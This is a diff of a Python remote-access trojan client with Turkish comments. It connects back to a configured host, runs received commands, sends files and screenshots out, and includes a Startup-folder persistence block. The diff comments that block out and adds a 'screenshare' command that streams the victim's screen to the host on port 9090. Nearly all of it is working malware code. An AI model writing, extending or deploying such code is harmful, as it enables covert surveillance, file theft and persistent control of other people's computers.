@@ -1,14 +1,12 @@
 import socket
 import os
 import time
-import subprocess
-import sys
 import pyautogui
-host="127.0.0.1"  #CHANGE ME
-port=2505        #CHANGE ME
+host="127.0.0.1"
+port=2505
 
 
-
+"""
 #kalıcılık----------------------------------------------------
 pyname=os.path.basename(__file__)
 print(pyname)
@@ -16,7 +14,7 @@ exename=pyname.replace(".py",".exe")
 print(exename)
 os.system(f"copy {pyname} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\startup\" ")
 #kalıcılık-----------------------------------------------------
-
+"""
 
 def main():
     try:
@@ -53,7 +51,7 @@ def main():
                 oncekıdızın=os.path.dirname(dizinimiz)
                 os.chdir(oncekıdızın)
                 response="dizin değiştirildi"
-
+        
             elif emir.startswith("touch"):
                 touch=emir.split()
                 touch=touch[1]
@@ -85,7 +83,24 @@ def main():
                         Baglantı.send(chunk)
                         chunk=file.read(16384)
                     response=""
-                    
+
+            elif emir=="screenshare":
+                try:
+                    from vidstream import ScreenShareClient
+                    screen=ScreenShareClient(host,9090)       
+                    screen.start_stream()
+                    response="bağlantı başarılı"
+                except Exception as e:
+                    print(e)
+                    response=e
+            
+            elif emir=="stopscreen":
+                try:
+                    screen.stop_stream()
+                    response="yayın durduruldu"
+                except Exception as e:
+                    response=e
+                    print(e)
 
             elif emir.startswith("screenshot"):
 
@@ -110,6 +125,6 @@ def main():
     except Exception as e:
         print(e)
         time.sleep(5)
-        subprocess.run([sys.executable, *sys.argv])
+        main()
 
 main()
